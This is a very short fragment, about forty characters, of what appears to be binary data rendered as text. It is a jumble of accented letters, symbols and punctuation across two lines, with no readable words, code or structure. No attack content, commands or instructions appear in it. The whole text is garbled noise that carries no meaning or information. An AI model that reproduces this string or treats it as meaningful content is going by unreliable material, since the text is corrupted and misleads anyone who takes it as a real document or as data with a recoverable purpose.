-3%ûGþúûékP®Ã¸CüB&
{ý80~!ý y+ üâH<#9&"6
